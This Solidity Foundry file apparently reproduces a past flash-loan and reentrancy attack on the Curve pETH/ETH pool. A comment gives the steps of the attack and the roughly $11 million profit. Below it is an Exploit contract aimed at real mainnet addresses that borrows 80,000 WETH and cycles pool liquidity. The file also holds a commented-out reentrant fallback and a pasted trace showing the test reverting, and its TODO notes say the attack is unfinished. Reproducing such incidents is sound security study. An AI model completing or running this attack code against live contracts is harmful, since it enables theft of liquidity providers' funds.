// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/Test.sol";

/*
1. The exploiter opened an 80,000 WETH flash loan from Balancer and unwrapped all to ETH.

2. They provided 40,000 ETH as liquidity to the Curve pETH/ETH pool and received 32,431.41 pETH-ETH LP tokens.

3. 3,740 pETH and 34,316 ETH was removed from the pool by burning 32,431.41 pETH/ETH pool LP tokens.

4. They again provided 40,000 ETH as liquidity to the Curve pETH/ETH pool, minting 82,182 more LP tokens.

5. Another 1,184.73 pETH and 47,506.53 ETH was withdrawn by burning 10,272.84 Curve LP tokens.

6. 4,924 pETH was swapped for 4,285 ETH within the Curve pool.

7. 86,106.65 ETH was wrapped to WETH.

8. 80,000 WETH repaid to Balancer to return the flash loan.

9. 6,106.65 WETH ~$11 million was retained as profit.

https://ethtx.info/mainnet/0xa84aa065ce61dbb1eb50ab6ae67fc31a9da50dd2c74eefd561661bfce2f1620c/
*/

interface IFlashLoanRecipient {
    function receiveFlashLoan(IERC20[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
}

interface IVault {
    function flashLoan(IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface ICurvePool {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function add_liquidity(uint256[2] calldata _amounts, uint256 _min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _burn_amount, uint256[2] calldata _min_amounts) external returns (uint256[] memory);
    function exchange(int128 i, int128 j, uint256 dx, uint256 _min_dy, address) external payable returns (uint256);
}

interface IWETH {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}


contract Exploit is IFlashLoanRecipient {
    error NOT_OWNER();
    error NOT_VAULT();

    ICurvePool public constant peth_eth_pool = ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IVault public constant balancerVault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH public constant weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant peth = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    address public immutable owner;

    uint256 public executionCount = 0;

    constructor (address owner_) {
        owner = owner_;
    }

    modifier onlyOwner {
        if (msg.sender != owner && msg.sender != address(this)) {
            revert NOT_OWNER();
        }
        _;
    }

    // Fallback function has 2300 gas limit!
    // fallback() external payable {
    //     // TODO: FIX THIS FALLBACK FUNCTION!!!!
    //     // remove liquidity gives u eth and it will trigger the fallback again
    //     // we need an execution counter which allows fallback to call the right functions
    //     uint256[2] memory _amounts;
    //     _amounts[0] = 40000 ether;
    //     _amounts[1] = 0;

    //     uint256[2] memory _min_amounts;
    //     _min_amounts[0] = 0;
    //     _min_amounts[1] = 0;

    //     // Add liquidity to curve pool
    //     try peth_eth_pool.add_liquidity{value: 40000 ether, gas: 1000000}(_amounts, 0) {
    //     } catch {
    //         // do nothing
    //     }

    //     // remove liquidity
    //     uint256 peth_eth_balance = peth_eth_pool.balanceOf(address(this));

    //     try peth_eth_pool.remove_liquidity(peth_eth_balance, _min_amounts) {
    //     } catch {
    //         // do nothing
    //     }

    //     // remove liquidity gives u eth and it will trigger the fallback again
    //     // we need an execution counter which allows fallback to call the right functions
    //     peth_eth_balance = peth_eth_pool.balanceOf(address(this));

    //     try peth_eth_pool.remove_liquidity(peth_eth_balance, _min_amounts) {
    //     } catch {
    //         // do nothing
    //     }

    //     uint256 pethBalance = peth.balanceOf(address(this));
    //     try peth_eth_pool.exchange(1, 0, pethBalance, pethBalance - 1000000000000000000000, address(this)) {
    //     } catch {
    //         // do nothing
    //     }

    //     // deposit eth for weth
    //     try weth.deposit{value: address(this).balance, gas: 1000000}() {
    //     } catch {
    //         // do nothing
    //     }

    //     try weth.transfer(address(balancerVault), 80000 ether) {
    //     } catch {
    //         // do nothing
    //     }

    //     // Transfer eth to owner
    //     try weth.transfer(owner, weth.balanceOf(address(this))) {
    //     } catch {
    //         // do nothing
    //     }
    //     return;
    // }

    // TODO: we need to first fix this out of gas problem here
    // fall back functions only 2300
    fallback() external payable {
        // TODO: only make flash loan the first time
        // makeFlashLoan();
        // weth.deposit{value: address(this).balance}();
        // weth.transfer(address(balancerVault), 80000 ether);
        // if (msg.sender == 0x9848482da3Ee3076165ce6497eDA906E66bB85C5) {
            // Do nothing
        // }
        // else {
            // uint256[2] memory _amounts;
            // _amounts[0] = 40000 ether;
            // _amounts[1] = 0;
            // peth_eth_pool.add_liquidity{value: 40000 ether}(_amounts, 0);
        // }
    }

    function makeFlashLoan() public {
        IERC20[] memory ierc20array = new IERC20[](1);
        ierc20array[0] = IERC20(address(weth));

        uint256[] memory amountsArray = new uint256[](1);
        amountsArray[0] = 80000 ether;

        balancerVault.flashLoan(this, ierc20array, amountsArray, "");
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) public override {
        if (msg.sender != address(balancerVault)) {
            revert NOT_VAULT();
        }

        // require(address(peth_eth_pool).balance <= 5000 ether, "Not Enough Ether");
        // require(weth.balanceOf(address(this)) == 80000 ether, "We don't have the eth we want");


        // Withdraw ETH from WETH
        weth.withdraw(80000 ether);

        uint256[2] memory _amounts;
        _amounts[0] = 40000 ether;
        _amounts[1] = 0;

        uint256[2] memory _min_amounts;
        _min_amounts[0] = 0;
        _min_amounts[1] = 0;


        peth_eth_pool.add_liquidity{value: 40000 ether}(_amounts, 0);

        uint256 peth_eth_balance = peth_eth_pool.balanceOf(address(this));

        console2.log(peth_eth_balance);
        peth_eth_pool.approve(address(peth_eth_pool), peth_eth_balance);
        peth.approve(address(peth_eth_pool), 100000 ether);
        require(peth_eth_pool.allowance(address(this), address(peth_eth_pool)) == peth_eth_balance);

        // TODO THIS FAILS!!!!!!
        /*
          [325521] CounterTest::testExploit()
    ├─ [40] Exploit::fallback{value: 800000000000000000000000}()
    │   └─ ← ()
    ├─ [313262] Exploit::makeFlashLoan()
    │   ├─ [309313] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [80000000000000000000000 [8e22]], 0x)
    │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000012612c5b115613407149
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [27962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 80000000000000000000000 [8e22])
    │   │   │   ├─ emit Transfer(param0: 0xBA12222222228d8Ba445958a75a0704d566BF2C8, param1: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 80000000000000000000000 [8e22])
    │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [207516] Exploit::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [80000000000000000000000 [8e22]], [0], 0x)
    │   │   │   ├─ [7344] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(80000000000000000000000 [8e22])
    │   │   │   │   ├─ [40] Exploit::fallback{value: 80000000000000000000000}()
    │   │   │   │   │   └─ ← ()
    │   │   │   │   ├─ emit Withdrawal(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 80000000000000000000000 [8e22])
    │   │   │   │   └─ ← ()
    │   │   │   ├─ [86040] 0x9848482da3Ee3076165ce6497eDA906E66bB85C5::add_liquidity{value: 40000000000000000000000}([40000000000000000000000 [4e22], 0], 0)
    │   │   │   │   ├─ [83356] 0x6326DEbBAa15bCFE603d831e7D75f4fc10d9B43E::add_liquidity([40000000000000000000000 [4e22], 0], 0) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 32431418915862116695669 [3.243e22])
    │   │   │   │   │   ├─ emit AddLiquidity(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: [40000000000000000000000 [4e22], 0], param2: [4421749730658949548 [4.421e18], 2913376661805340593 [2.913e18]], param3: 43621854439637124701736 [4.362e22], param4: 43646820214778998853971 [4.364e22])
    │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   ├─ [1481] 0x9848482da3Ee3076165ce6497eDA906E66bB85C5::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [1309] 0x6326DEbBAa15bCFE603d831e7D75f4fc10d9B43E::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   ├─ [0] console::log(32431418915862116695669 [3.243e22]) [staticcall]
    │   │   │   │   └─ ← ()
    │   │   │   ├─ [24588] 0x9848482da3Ee3076165ce6497eDA906E66bB85C5::approve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5, 32431418915862116695669 [3.243e22])
    │   │   │   │   ├─ [24410] 0x6326DEbBAa15bCFE603d831e7D75f4fc10d9B43E::approve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5, 32431418915862116695669 [3.243e22]) [delegatecall]
    │   │   │   │   │   ├─ emit Approval(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x9848482da3Ee3076165ce6497eDA906E66bB85C5, param2: 32431418915862116695669 [3.243e22])
    │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [24681] 0x836A808d4828586A69364065A1e064609F5078c7::approve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5, 100000000000000000000000 [1e23])
    │   │   │   │   ├─ emit Approval(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x9848482da3Ee3076165ce6497eDA906E66bB85C5, param2: 100000000000000000000000 [1e23])
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [1604] 0x9848482da3Ee3076165ce6497eDA906E66bB85C5::allowance(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x9848482da3Ee3076165ce6497eDA906E66bB85C5) [staticcall]
    │   │   │   │   ├─ [1426] 0x6326DEbBAa15bCFE603d831e7D75f4fc10d9B43E::allowance(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x9848482da3Ee3076165ce6497eDA906E66bB85C5) [delegatecall]
    │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000006de1c599af47599fe75
    │   │   │   ├─ [57316] 0x9848482da3Ee3076165ce6497eDA906E66bB85C5::remove_liquidity(32431418915862116695669 [3.243e22], [0, 0])
    │   │   │   │   ├─ [57166] 0x6326DEbBAa15bCFE603d831e7D75f4fc10d9B43E::remove_liquidity(32431418915862116695669 [3.243e22], [0, 0]) [delegatecall]
    │   │   │   │   │   ├─ [18] PRECOMPILE::identity(0x)
    │   │   │   │   │   │   └─ ← 0x
    │   │   │   │   │   ├─ [40] Exploit::fallback{value: 34316009777207925757865}()
    │   │   │   │   │   │   └─ ← ()
    │   │   │   │   │   ├─ [18] PRECOMPILE::identity(a9059cbb)
    │   │   │   │   │   │   └─ ← a9059cbb
    │   │   │   │   │   ├─ [27] PRECOMPILE::identity(0000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000cacba060ce1de05913)
    │   │   │   │   │   │   └─ ← 0000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000cacba060ce1de05913
    │   │   │   │   │   ├─ [32136] 0x836A808d4828586A69364065A1e064609F5078c7::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 3740915136913683274003 [3.74e21])
    │   │   │   │   │   │   ├─ emit Transfer(param0: 0x9848482da3Ee3076165ce6497eDA906E66bB85C5, param1: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 3740915136913683274003 [3.74e21])
    │   │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ [21] PRECOMPILE::identity(00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   │   │   └─ ← 00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   ├─ emit Transfer(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x0000000000000000000000000000000000000000, param2: 32431418915862116695669 [3.243e22])
    │   │   │   │   │   ├─ emit RemoveLiquidity(param0: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: [34316009777207925757865 [3.431e22], 3740915136913683274003 [3.74e21]], param2: [0, 0], param3: 11215401298916882158302 [1.121e22])
    │   │   │   │   │   └─ ← 0x000000000000000000000000000000000000000000000744464d565bcdff57a90000000000000000000000000000000000000000000000cacba060ce1de05913
    │   │   │   │   └─ ← 0x000000000000000000000000000000000000000000000744464d565bcdff57a90000000000000000000000000000000000000000000000cacba060ce1de05913
    │   │   │   └─ ← "EvmError: Revert"
    │   │   └─ ← "EvmError: Revert"
    │   └─ ← "EvmError: Revert"
    └─ ← "EvmError: Revert"

        */
        peth_eth_pool.remove_liquidity(peth_eth_balance, _min_amounts);

        // peth_eth_pool.exchange(1, 0, peth_eth_balance, peth_eth_balance - 1000000000000000000000, address(this));

        // Deposit ETH for WETH
        weth.deposit{value: address(this).balance}();

        // we are able to return eth here so the flashloan stuff works
        weth.transfer(address(balancerVault), 80000 ether);
    }
}
